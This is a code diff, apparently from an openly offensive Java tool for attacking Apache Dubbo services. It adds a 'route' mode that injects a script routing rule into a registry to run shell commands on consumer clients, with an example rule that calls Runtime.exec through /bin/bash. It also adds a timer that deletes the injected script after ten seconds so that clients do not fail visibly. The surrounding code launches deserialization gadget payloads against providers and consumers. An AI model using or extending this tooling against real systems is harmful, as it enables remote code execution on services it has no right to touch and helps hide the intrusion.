@@ -42,6 +42,9 @@ public class Main {
         .addOption("a", "args", true, "gadget入参，多个参数，需要多个命令传入，例-a http://127.0.0.1:800/ -a Calc")
         .addOption("l", "list", false, "输出所有payload信息")
         .addOption("f", "fastcheck", true, "快速攻击检查（使用预置参数数据文件，遍历所有gadget进行攻击检查），参数为数据文件路径，参考文件check.data")
+        .addOption("route", true, "route攻击类型，例：script")
+        .addOption("rule", true, "route script攻击类型脚本内容，例：\"s=[3];s[0]='/bin/bash';s[1]='-c';s[2]='open -a calculator';java.lang.Runtime.getRuntime().exec(s);\"")
+        .addOption("routeDeleteTtl", true, "route攻击注入内容删除时间，恶意脚本后，为避免长时间导致consumer客户端异常，默认10秒钟后删除，自定义通过该参数设置删除时间，单位秒")
         ;
 
     //parser
@@ -57,6 +60,9 @@ public class Main {
     String username = cmd.hasOption("username") ? cmd.getOptionValue("username") : "";
     String password = cmd.hasOption("password") ? cmd.getOptionValue("password") : "";
     String registryURL = cmd.hasOption("registryURL") ? cmd.getOptionValue("registryURL") : "";
+    String route = cmd.hasOption("route") ? cmd.getOptionValue("route") : "";
+    String rule = cmd.hasOption("rule") ? cmd.getOptionValue("rule") : "";
+    Integer routeDeleteTtl = cmd.hasOption("routeDeleteTtl") ? Integer.parseInt(cmd.getOptionValue("routeDeleteTtl")) : 10;
 
 
     String protocol = cmd.hasOption("protocol") ? cmd.getOptionValue("protocol") : "dubbo";
@@ -68,6 +74,7 @@ public class Main {
       return;
     }
 
+    //展示gadget列表
     if (cmd.hasOption("list")) {
       Payloads[] payloads = Payloads.values();
       for (int i = 0; i < payloads.length; i++) {
@@ -82,13 +89,15 @@ public class Main {
       return;
     }
 
-    if (!evil && !cmd.hasOption("target")) {
+    //简单参数条件检查
+    if (!evil && route.isEmpty() && !cmd.hasOption("target")) {
       System.err.println("目标不能为空，例：-t 127.0.0.1:20880");
       return;
     }
 
+    //gadget反序列化payload生成
     String[] payloadArgs = cmd.getOptionValues("args");
-    List<Payloads> payloadsList;
+    List<Payloads> payloadsList = new ArrayList<>();
     if (cmd.hasOption("fastcheck")) {
       CheckDataCenter.initFastCheckData(cmd.getOptionValue("fastcheck"));
       payloadsList = Payloads.getPayloads(s);
@@ -106,12 +115,13 @@ public class Main {
         }
         payloadsList = new ArrayList();
         payloadsList.add(payloadEnum);
-      } else {
+      } else if (route.isEmpty()) {
         System.err.println("gadget参数值不能为空，你必须输入一点参数来使gadget可以使用");
         return;
       }
     }
 
+    //攻击consumer
     if (evil) {
       byte[][] payload = new byte[payloadsList.size()][];
       for (int i = 0; i < payloadsList.size(); i++) {
@@ -127,7 +137,12 @@ public class Main {
       }
       new Exploit().evil(registryURL, scheme, username, password, evilHost, evilPort, registry != null && !registry.isEmpty(), payload, s, wait);
       System.exit(1);
+    } else if (!route.isEmpty()) {
+      new Exploit().route(registryURL, scheme, username, password, route, rule, routeDeleteTtl);
+      System.exit(1);
     }
+
+    //攻击provider
     for (Payloads p:payloadsList) {
       Serialization serialization = Serializations.getSerialization(p.getSerialization());
       serialization.setPayload(p.getPayload());
@@ -136,10 +151,10 @@ public class Main {
       String target = cmd.getOptionValue("target");
       String host = target;
       int port = 20880;
-      String path = "/";
+//      String path = "/";
       int index = target.indexOf("/");
       if (index != -1) {
-        path = target.substring(index);
+//        path = target.substring(index);
         target = target.substring(0, index);
       }
       index = target.indexOf(":");
